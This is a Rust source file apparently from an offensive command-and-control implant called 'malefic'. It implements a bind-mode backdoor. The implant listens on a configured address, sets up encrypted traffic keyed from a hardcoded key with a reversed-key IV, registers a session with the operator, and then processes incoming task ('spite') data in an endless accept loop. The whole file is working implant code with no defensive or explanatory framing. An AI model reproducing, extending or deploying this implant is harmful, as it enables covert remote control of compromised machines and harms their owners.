use malefic_core::config;
use malefic_core::transport::{Client, Transport, Listener, ListenerExt};
use malefic_proto::crypto::new_cryptor;
use malefic_helper::debug;
use malefic_proto::marshal_one;
use crate::stub::{MaleficStub};
use crate::malefic::MaleficChannel;

pub struct MaleficBind {
    stub: MaleficStub,
    listener: Listener, 
    client: Client,
    initialize: bool,
}

impl MaleficBind {
    pub async fn new(channel: MaleficChannel) -> Result<Self, Box<dyn std::error::Error>> {
        let stub = MaleficStub::new([0; 4], channel);
        let addr = config::URLS.first().unwrap().clone();

        // 使用静态类型的 Listener 绑定地址
        let listener = Listener::bind(addr.as_str()).await.map_err(|e| {
            debug!("Failed to bind listener: {:#?}", e);
            panic!("Failed to bind listener");
        }).unwrap();

        debug!("Listening on {}", addr);
        let iv: Vec<u8> = config::KEY.to_vec().iter().rev().cloned().collect();

        let client = Client::new(new_cryptor(config::KEY.to_vec(), iv))
            .map_err(|e| {
                debug!("[bind] Failed to initialize client: {}", e);
                e
            })?;

        Ok(MaleficBind {
            client,
            stub,
            listener,
            initialize: false
        })
    }
    
    pub async fn init(&mut self, transport: Transport) -> anyhow::Result<()> {
        let init = self.client.recv(transport.clone()).await?;
        self.stub.meta.set_id(init.session_id);
        let data = marshal_one(init.session_id, self.stub.register_spite())?;
        self.client.stream.send(transport.clone(), data.pack()).await.map_err(|e| {
            debug!("[bind] Failed to send data: {:#?}", e);
            e
        })?;
        self.initialize = true;
        debug!("Init success");
        let _ = transport.clone().close().await;
        Ok(())
    }
    
    pub async fn run(&mut self) -> Result<(), ()> {
        loop {
            match self.listener.accept().await {
                Ok(transport) => {
                    let transport = Transport::new(transport);
                    if !self.initialize {
                        self.init(transport).await.map_err(|e| {
                            debug!("[bind] Failed to init: {:#?}", e);
                        })?;
                    }else{
                        if let Err(e) = self.stub.process_data(transport, &mut self.client).await {
                            debug!("[bind] Error processing spite data: {:#?}", e);
                            continue;
                        }
                    }
                }
                Err(e) => {
                    debug!("[bind] Failed to accept connection: {:#?}", e);
                }
            }
        }
    }
}
